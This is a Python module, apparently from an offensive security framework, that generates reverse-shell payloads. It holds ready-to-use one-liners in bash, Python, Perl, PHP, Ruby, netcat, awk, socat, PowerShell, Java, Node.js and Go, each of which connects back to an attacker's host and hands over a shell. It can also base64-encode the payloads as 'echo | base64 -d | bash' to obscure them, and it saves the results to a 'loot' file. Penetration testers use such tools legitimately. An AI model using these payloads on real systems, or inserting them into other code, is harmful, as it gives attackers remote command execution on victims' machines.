import os
import base64
from pathlib import Path
from rich.console import Console
from rich.syntax import Syntax
from utils.logger import log_action

console = Console()

SHELLS = {
    'bash':   'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    'bash_196': 'exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196',
    'python3': "python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect(('{LHOST}',{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(['/bin/sh','-i'])\"",
    'python2': "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
    'perl':   "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    'php':    "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'ruby':   "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    'netcat': 'nc -e /bin/sh {LHOST} {LPORT}',
    'netcat_mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
    'awk':    "awk 'BEGIN {{s=\"/inet/tcp/0/{LHOST}/{LPORT}\";while(42){{do{{if((s|&getline c)<=0)break;if(c){{}}}});while(c!=\"exit\")close(s)|&print c=\"\";s|&getline c}}}}'",
    'socat':  'socat tcp-connect:{LHOST}:{LPORT} exec:"/bin/sh",pty,stderr,setsid,sigint,sane',
    'powershell': "$client=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    'java':   "r = Runtime.getRuntime()\np = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done'] as String[])\np.waitFor()",
    'nodejs': "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"')",
    'golang': "package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}",
}

class Module:
    MODULE_INFO = {
        'name': 'post/reverse_shell_gen',
        'description': 'Generate reverse shell payloads for bash, python, php, perl, ruby, nc, powershell, and more.',
        'options': {
            'LHOST': 'Your listener IP address',
            'LPORT': 'Your listener port [default: 4444]',
            'TYPE': f'Shell type: {", ".join(SHELLS.keys())}, ALL [default: ALL]',
            'ENCODE': 'Base64-encode the payload [default: false]',
            'OUTPUT': 'Save payloads to file [default: loot/shells_<LPORT>.txt]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        lhost = self.framework.options.get('LHOST')
        lport = self.framework.options.get('LPORT', '4444')
        shell_type = self.framework.options.get('TYPE', 'ALL').lower()
        encode = self.framework.options.get('ENCODE', 'false').lower() == 'true'
        output = self.framework.options.get('OUTPUT', f'loot/shells_{lport}.txt')

        if not lhost:
            console.print("[red][!] LHOST is required.[/red]")
            return

        Path('loot').mkdir(exist_ok=True)

        selected = SHELLS if shell_type == 'all' else {shell_type: SHELLS[shell_type]} if shell_type in SHELLS else None
        if selected is None:
            console.print(f"[red][!] Unknown shell type: {shell_type}. Valid: {', '.join(SHELLS.keys())}, all[/red]")
            return

        console.print(f"[cyan][*] Generating reverse shells for {lhost}:{lport}...[/cyan]\n")
        log_action(f"Reverse shell gen: {lhost}:{lport} type={shell_type}")

        lines = [f"# Reverse shells — LHOST={lhost} LPORT={lport}\n"]
        for name, template in selected.items():
            payload = template.replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
            if encode:
                payload_b64 = base64.b64encode(payload.encode()).decode()
                display = f'echo {payload_b64} | base64 -d | bash'
            else:
                display = payload

            console.print(f"[bold cyan]--- {name.upper()} ---[/bold cyan]")
            synx = Syntax(display, 'bash', theme='monokai', word_wrap=True)
            console.print(synx)
            console.print()
            lines.append(f"# {name}\n{display}\n")

        with open(output, 'w') as f:
            f.write('\n'.join(lines))
        console.print(f"[green][+] {len(selected)} payload(s) saved to {output}[/green]")
        console.print(f"\n[dim]Start listener: nc -lvnp {lport}[/dim]")
